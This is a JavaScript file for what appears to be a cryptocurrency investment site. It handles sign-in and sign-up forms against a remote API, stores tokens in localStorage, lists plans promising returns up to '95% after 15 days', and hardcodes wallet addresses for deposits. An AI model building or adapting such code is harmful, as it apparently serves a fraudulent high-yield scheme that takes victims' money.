
const api = "https://lin.com.ng/iv/";
async function handleForm(elem,e){
    e.preventDefault();
    let working = "Processing..."
    let btnClicked = e.submitter,previousCaption = null;
    
      previousCaption = (btnClicked.tagName.toLowerCase() == "input")?btnClicked.value:btnClicked.textContent;
      (btnClicked.tagName.toLowerCase() == "input")?btnClicked.value = working:btnClicked.textContent = working;
      btnClicked.disabled = true;


    const data = new FormData(elem);
    const payload = {};
    data.forEach((v,k)=>{
        payload[k] = v;
    });
    let res = null;
    try{
        const req = await fetch(api+elem.getAttribute("route"),{method:"POST",headers:{"token":window.localStorage.getItem("token")},body:JSON.stringify(payload)});
     res = await req.json();
    }catch(e){
        res = {status:0,message:"Server error!"}
    }
    // console.log(res);
    if(res.status){
        if(elem.getAttribute("route").includes("signup") || elem.getAttribute("route").includes("signin")){
            window.localStorage.setItem("token",res.token);
            window.localStorage.setItem("user_acct_info",JSON.stringify(res.balance));
            if(res.user?.level == 1){
              window.location.href = "./admin.html";
            }else{
              window.location.href = "./dashboard.html";
            }
        }
          Swal.fire({
            icon: "success",
            text: res.message
          });
          if(elem.getAttribute("redirect").length > 0){
              setTimeout(()=>{
                 window.location.replace(elem.getAttribute("redirect"));
              },2500);
          }
    }else{
        Swal.fire({
            icon: "error",
            text: res.message
          });
    }
   
    if(btnClicked != null){
        (btnClicked.tagName.toLowerCase() == "input")? btnClicked.value = previousCaption:btnClicked.textContent = previousCaption;
        btnClicked.disabled = false;
    }
}

function capitalizeFirstLetter(str) {
    return str.charAt(0).toUpperCase() + str.slice(1);
}

const queryString = window.location.search; 
const params = new URLSearchParams(queryString);
const query = {};
params.forEach((value, key) => {
  query[key] = value;
});


var plans = [
    "15% after 2 days",
    "25% after 3 days",
    "35% after 4 days",
    "45% after 5 days",
    "55% after 6 days",
    "75% after 10 days",
    "95% after 15 days"
  ];
  if(document.getElementById("payment_method")){
    document.getElementById("payment_method").onchange = function(){
      const pm = {
        USDT:"TYM6CiMeZN92r2wVp5z6SmDveucwsdDPwR",
        ETHEREUM:"0xff7bc34c52eda8e78c4c09154076c6f20d588694",
        Bitcoin:"3JrFxRRk3AewfFubfPnJiJXzd7VhHVcsEc"
      };
      window.localStorage.setItem("payment_method",pm[this.value]);
    }
  }
  